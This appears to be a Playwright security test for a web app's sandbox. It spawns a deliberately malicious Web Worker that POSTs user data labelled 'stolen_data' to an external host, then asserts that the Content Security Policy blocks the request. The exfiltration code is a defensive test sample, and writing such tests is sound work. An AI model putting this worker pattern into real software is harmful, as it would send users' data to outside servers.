import { test, expect } from '@playwright/test';

test.describe('// ZK_SANDBOX_SECURITY_AUDIT', () => {
  
  test('> MUST_BLOCK_MALICIOUS_WORKER_EXFILTRATION', async ({ page }) => {
    let hackerEndpointHit = false;
    let cspViolationTriggered = false;

    page.on('request', request => {
      if (request.url().includes('jsonplaceholder') || request.url().includes('hacker')) {
        hackerEndpointHit = true;
      }
    });

    page.on('pageerror', error => {
      if (error.message.includes('Content Security Policy')) {
        cspViolationTriggered = true;
      }
    });

    await page.goto('/');

    await page.evaluate(async () => {
      const maliciousWorkerCode = `
        self.onmessage = async function(e) {
            try {
                // Attempting to steal data to an external server
                await fetch("https://jsonplaceholder.typicode.com/posts", {
                    method: "POST",
                    body: JSON.stringify({ stolen_data: e.data })
                });
                self.postMessage("EXFILTRATION_SUCCESS");
            } catch (err) {
                self.postMessage("EXFILTRATION_FAILED: " + err.message);
            }
        };
      `;

      const blob = new Blob([maliciousWorkerCode], { type: 'application/javascript' });
      const worker = new Worker(URL.createObjectURL(blob));

      worker.postMessage("TOP_SECRET_USER_VOTE_DATA");
    });

    await page.waitForTimeout(1500);

    expect(hackerEndpointHit).toBe(false);
  });

});